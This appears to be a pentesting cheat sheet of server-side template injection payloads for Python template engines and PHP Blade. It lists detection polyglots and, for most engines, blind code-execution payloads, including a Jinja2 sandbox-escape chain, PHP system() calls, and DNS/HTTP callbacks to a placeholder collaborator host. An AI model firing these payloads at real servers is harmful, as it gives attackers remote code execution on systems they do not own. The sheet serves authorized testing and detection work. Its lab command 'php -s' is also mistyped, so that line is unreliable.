# SSTI Payloads & Observation

## Python Template Engines

### Chameleon Detection

#### Universal Error-Based Polyglots
- `<%'${{/#{@}}%>{{` - Error
- `<%'${{#{@}}%>` - Error

#### Specific Error-Based Polyglots
- `{{@` - Unmodified
- `<%'#{@}` - Unmodified
- `<th:t="${xu}#foreach.` - Error

#### Specific Non-Error-Based Polyglots
- `{{.}}` - Unmodified
- `#evaluate("a")` - Unmodified
- `${"<%-1-%>"}` - Unmodified
- `{{1in[1]}}` - Unmodified
- `<%%a%>` - Unmodified

#### Blind SSTI
> Use these when 500 errors are masked by generic 200 responses.

- `${repeat.__class__.__init__.__globals__['__builtins__']['__import__']('time').sleep(5)}` - delays can be observed
- `${str(repeat.__class__.__init__.__globals__['__builtins__']['__import__']('socket').gethostbyname('<your-webhooks-/-collaborator>'))}` - DNS based if web traffic is blocked
- `${str(repeat.__class__.__init__.__globals__['__builtins__']['__import__']('urllib.request').request.urlopen('http://<your-webhooks-/-collaborator>'))}` - HTTP request trigger works only if web traffic is allowed
---
### Cheetah Detection

#### Universal Non-Error-Based Polyglots
- `<%=1%>@*#{1}` - `1@*#{1}`
- `{##}/*{{.}}*/` - `{` (everything following on same line removed)

#### Specific Non-Error-Based Polyglots
- `<%=1%>#{2}{{a}}` - `1#{2}{{a}}`

#### Blind SSTI
- `$__import__('time').sleep(5)` - Time based
- `$str($__import__('socket').gethostbyname('cheetah-blind.<your-webhooks-/-collaborator>'))` - DNS based if web traffic is blocked
- `$str($__import__('urllib.request', fromlist=['request']).urlopen('http://<your-webhooks-/-collaborator>'))` - HTTP request trigger works only if web traffic is allowed
---
### Django Detection

#### Universal Non-Error-Based Polyglots
- `{##}/*{{.}}*/` - `/**/`

#### Specific Non-Error-Based Polyglots
- `{{1in[1]}}` - Error
---
### Jinja2 & Jinja2 (Sandbox) Detection

#### Universal Non-Error-Based Polyglots
- `p ">[[${{1}}]]` - `p ">[[$1]]`
- `<%=1%>@*#{1}` - Unmodified
- `{##}/*{{.}}*/` - Error

#### Specific Non-Error-Based Polyglots
- `<%=1%>#{2}{{a}}` - `<%=1%>#{2}`

#### Blind SSTI
- `{{ "".__class__.__mro__[1].__subclasses__()|selectattr("__name__", "equalto", "catch_warnings")|map(attribute="__init__")|map(attribute="__globals__")|first|attr("__getitem__")("__builtins__")|attr("__getitem__")("__import__")("time")|attr("sleep")(5) }}` - Time based
- `{{ "".__class__.__mro__[1].__subclasses__()|selectattr("__name__", "equalto", "catch_warnings")|map(attribute="__init__")|map(attribute="__globals__")|first|attr("__getitem__")("__builtins__")|attr("__getitem__")("__import__")("socket")|attr("gethostbyname")("jinja-success.<your-webhooks-/-collaborator>") }}` - DNS
- `{{ "".__class__.__mro__[1].__subclasses__()|selectattr("__name__", "equalto", "catch_warnings")|map(attribute="__init__")|map(attribute="__globals__")|first|attr("__getitem__")("__builtins__")|attr("__getitem__")("__import__")("urllib.request")|attr("request")|attr("urlopen")("http://<your-webhooks-/-collaborator>") }}` - Web traffic

#### Sandbox Detection Tip
- `{{ [].__class__.__base__ }}` - `<class 'object'>` indicates Jinja2
- A 500 server error when accessing special attributes may indicate Jinja2 sandbox restrictions
---
### Mako Detection

#### Universal Non-Error-Based Polyglots
- `<%=1%>@*#{1}` - Error

#### Specific Non-Error-Based Polyglots
- `${"<%-1-%>"}` - `<%-1-%>`

#### Blind SSTI
- `${__import__('time').sleep(5)}` - Time based
- `${__import__('socket').gethostbyname('mako-blind.<your-webhooks-/-collaborator>')}` - DNS
- `${__import__('urllib.request', fromlist=['request']).urlopen('http://<your-webhooks-/-collaborator>')}` - Web traffic
---
### Pystache Detection

#### Universal Error-Based Polyglots
- `<%'${{#{@}}%>` - `%>`
- `${{<%[%'"}}%\` - `$%\`
- `<#set($x<%={{={@{#{${xux}}%>)` - `<#set($x<%=%>)`

#### Specific Error-Based Polyglots
- `<%${{#{%>}}` - empty string with everything preceding removed

#### Universal Non-Error-Based Polyglots
- `{##}/*{{.}}*/` - `{##}/**/`

#### Specific Non-Error-Based Polyglots
- `//*<!--{##<%=1%>{{!--{{1}}--}}-->*/#}` - `//*<!--{##<%=1%>--}}-->*/#}`
---
### SimpleTemplateEngine Detection

#### Universal Error-Based Polyglots
- `${{<%[%'"}}%\` - Unmodified

#### Specific Error-Based Polyglots
- `{{/}}` - Error

#### Blind SSTI
- `{{ __import__('time').sleep(5) }}` - Time based
- `{{ __import__('socket').gethostbyname('simple-template.<your-webhooks-/-collaborator>') }}` - DNS
- `{{ __import__('urllib.request', fromlist=['request']).urlopen('http://<your-webhooks-/-collaborator>') }}` - Web traffic
---
### Tornado Detection

#### Specific Error-Based Polyglots
- `<%{{#{%>}` - Error
- `{{@` - Error

#### Specific Non-Error-Based Polyglots
- `<%=1%>#{2}{{a}}` - Error

#### Blind SSTI
- `{{ __import__('time').sleep(5) }}` - Time based
- `{{ __import__('socket').gethostbyname('tornado-engine.<your-webhooks-/-collaborator>') }}` - DNS
- `{{ __import__('urllib.request', fromlist=['request']).urlopen('http://<your-webhooks-/-collaborator>') }}` - Web traffic

---
## PHP Template Engines

### Blade Detection

#### Specific Error-Based Polyglots
- `<%{{#{%>}`- Unmodified
- `{{@` - Unmodified
- `{{` - Unmodified

#### Specific Non-Error-Based Polyglots
- `{#${{1}}#}}` - `{#$1#}}`

#### Blind SSTI
- `@php system('sleep 5'); @endphp` - delays can be observed
- `{{ print_r(dns_get_record(uniqid().'<your-webhooks-/-collaborator>', DNS_A)) }}` - DNS based if web traffic is blocked
> Here, the dns_get_record is an native php utility. Also uniqid() prevents from caching the DNS traffic thus no hits will be observed
- `{{ print_r(get_headers('http://'.uniqid().'<your-webhooks-/-collaborator>')) }}` - HTTP request trigger works only if web traffic is allowed
> Here, get_headers is an native php utility.

#### To run the lab
```
composer require illuminate/view illuminate/events 
php -s 127.0.0.1:5001
```
---
